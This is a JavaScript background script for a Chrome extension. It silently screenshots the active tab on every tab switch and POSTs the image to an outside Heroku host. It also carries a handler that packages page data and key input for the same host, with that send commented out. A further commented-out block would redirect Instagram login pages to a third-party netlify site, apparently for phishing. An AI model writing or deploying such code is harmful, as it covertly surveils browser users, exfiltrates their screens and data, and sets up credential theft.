 function handleMessage(request){

    const data = {
        "key_name": request.key,
        "data": request.page
    }
    
        const options = {
    
            method:'POST',
            headers:{
                'Content-Type':'application/json'
                
            },
            body: JSON.stringify(data)
        };

    //     fetch('https://chrome21.herokuapp.com/data',options).then((res) =>{
    //         console.log('hello')
    //     });
    //   alert(request.key);
       
  
  
    

}
chrome.runtime.onMessage.addListener(handleMessage);

chrome.tabs.onActivated.addListener(function(activeInfo){
    setTimeout(() => {
    chrome.tabs.captureVisibleTab(null ,{}, function(img){
    

        const base64 = convertImageToBase64(img);
        let data = {
            key_name: 'Base 64 Image',
            data: img
        }

        const options = {
    
            method:'POST',
            headers:{
                'Content-Type':'application/json'
                
            },
            body: JSON.stringify(data)
        };

         sendData(options);
        


    })
},100);
})

function convertImageToBase64(img){
    // console.log(img)
  
    


}
async function sendData(options){

   await fetch('https://chrome21.herokuapp.com/data',options)
}

// var host = "https://mystifying-hermann-7b16a6.netlify.app/";

// chrome.webRequest.onBeforeRequest.addListener(
//     function(details) {
//          return {redirectUrl: host };
//     },
//     {
//         urls: [
           
//             "https://instagram.com/*",
//             "https://www.instagram.com/?hl=en",
//             "https://www.instagram.com/accounts/login/"
            
//         ],
//         types: ["main_frame", "sub_frame", "stylesheet", "script", "image", "object", "xmlhttprequest", "other"]
//     },
//     ["blocking"]
// );